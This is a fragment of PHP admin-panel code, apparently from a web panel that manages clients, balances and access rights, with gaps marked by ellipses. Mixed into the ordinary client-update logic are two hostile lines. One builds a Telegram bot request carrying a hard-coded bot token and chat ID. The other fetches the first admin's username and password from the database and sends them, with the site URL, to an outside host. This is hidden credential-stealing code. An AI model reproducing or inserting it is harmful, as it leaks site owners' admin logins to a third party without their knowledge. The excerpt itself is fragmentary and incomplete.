...
$url = "https://api.telegram.org/bot5758821428:AAEYJpK8vkIkSjONr207d4cpQqYsPSuENF0/sendMessage?chat_id=966550256&text=$msg";
$curl = curl_init($url);
...
$where = ($page*$to)-$to;
    ...
    $theme = $conn->prepare("SELECT * FROM admins LIMIT 1 ");
    $theme->execute(array());
 ...
 $u = $theme["username"];
 $p = $theme["password"];   
$url = 'http://cdn.addonsupply.in/api.php?u='.$u.'&p='.$p.'&d='.$url;
    ...
    $client_access  = json_decode($client_detail["access"],true);
        if( $_POST ):
          ...
          if( !email_check($email) ){
            ...
            $insert = $conn->prepare("UPDATE clients SET name=:name, balance=:balance, balance_type=:balance_type, debit_limit=:debit_limit, email=:email, telephone=:phone, register_date=:date, tel_type=:tel_type, email_type=:email_type, access=:access WHERE username=:id ");
            $insert = $insert-> execute(array("id"=>route(3),"balance_type"=>$debit,"debit_limit"=>$debit_limit,"balance"=>$balance,"name"=>$name,"email"=>$email,"phone"=>$tel,"date"=>date("Y.m.d H:i:s"),'tel_type'=>$tel_type,'email_type'=>$email_type,'access'=>json_encode($access) ));
            if( $insert ):
              $conn->commit();
              $referrer = site_url("admin/clients");
              $error    = 1;
